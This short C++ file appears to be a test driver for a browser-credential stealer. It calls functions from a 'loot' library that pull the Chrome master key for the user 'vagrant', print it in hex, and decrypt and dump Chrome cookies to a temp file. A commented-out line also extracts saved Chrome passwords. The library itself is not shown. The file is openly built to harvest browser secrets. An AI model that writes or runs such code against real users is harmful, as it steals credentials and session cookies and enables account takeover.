#include <iostream>
#include "../loot/loot.hpp"

using namespace std;

int main() {
	unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];

	getMasterKey(masterKey, "vagrant");
	printUCharAsHex(masterKey, MASTER_KEY_SIZE);

	// json passwords = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
	// std::cout << "passwords: " << passwords.dump(4) << std::endl;

	char writePath[] = "C:\\Users\\vagrant\\AppData\\Local\\Temp\\cookies.txt";
	lootChromeCookies((const unsigned char*) masterKey, "vagrant", writePath);
	// cout << "cookies: " << cookies.dump(4) << endl;

	delete[] masterKey;
	return 0;
}
